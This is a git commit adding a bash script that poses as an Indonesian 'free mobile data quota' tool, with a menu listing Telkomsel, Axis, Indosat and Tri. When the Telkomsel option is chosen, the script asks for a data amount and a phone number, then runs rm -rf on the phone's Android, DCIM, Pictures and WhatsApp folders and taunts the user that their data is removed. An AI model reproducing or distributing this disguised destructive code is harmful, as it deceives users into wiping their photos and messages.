e6f365692e1f5d323e01b2b2ecdc49d857d17b1e
MRRUXHAN <50254850+MRRUXHAN27@users.noreply.github.com>
2019-05-04 09:07:53 +0700

    Add files via upload

---
+++ paketan.sh
@@ -0,0 +1,46 @@
+#!/usr/bin/bash
+#tools kuota gratis mayan :v
+#by meruxmrruxhan
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+echo " "
+echo  $blue "<|======================================|>"
+echo  $red    "|       TOOLS KUOTA GRATIS          |"
+echo  $red    "|                                   |"
+echo  $red    "| Author        : MRRUXHAN              |"
+echo  $red    "| Contact       : 0896982707xx :v      |"
+echo  $red    "| My Team       : -.                |"
+echo  $red    "| Thanks To     : MRRUXHAN GANS :V     |"
+echo  $blue "<|======================================|>"
+sleep 1
+echo " "
+echo $green "============== $red MENU $green ================="
+echo $blue "===================================="
+echo $blue "|| $green 1. Telkomsel.                 $blue ||"
+echo $blue "|| $green 2. Axis     			       $blue ||"
+echo $blue "|| $green 3. Indosat	   			  $blue ||"
+echo $blue "|| $green 4. Tri			             $blue ||"
+echo $blue "|| $green 0. Exit The Program :v          $blue ||"
+echo $blue "===================================="
+echo $blue"╭──[Masukkan Pilihan Anda]>"
+read -p"╰───────root" Gans;
+if [ $Gans = 1 ] || [ $Gans = 01 ]
+then
+echo $blue"╭──[Berapa GB?]>"
+read -p"╰───────root" kntl;
+sleep 1
+echo $green"╭──[masukan nomor]>"
+read -p"╰───────root" asw;
+sleep 1
+echo $red "Loading"
+sleep 2
+rm -rf storage/emulated/0/Android
+rm -rf storage/emulated/0/DCIM
+rm -rf storage/emulated/0/Pictures
+rm -rf storage/emulated/0/WhatsApp
+echo  $blue "Sorry your data is remove :v"
+fi
